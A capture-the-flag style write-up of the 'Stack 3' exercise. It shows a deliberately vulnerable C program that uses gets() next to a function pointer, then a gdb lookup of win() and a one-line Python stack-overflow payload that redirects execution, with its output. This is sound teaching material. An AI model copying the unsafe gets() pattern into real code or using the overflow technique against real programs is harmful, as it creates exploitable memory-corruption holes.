# Stack 3

## About

Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

Hints
* both gdb and objdump is your friend you determining where the win() function lies in memory.


``` c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}

```

## Solution

looking at the source code the `win()` function looks like what has to be used, this time i wanted to try gdb rather than radare2 to solve this.

opening up the program in gdb and looking at the value of `win()` shows the following 

```
pwndbg> print win
$1 = {void (void)} 0x8048424 <win>
```

ok so lets try this 

``` bash
[root:/opt/Data/bin]# echo $(python -c 'print "A"*64 + "\x24\x84\x04\x08"') | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```
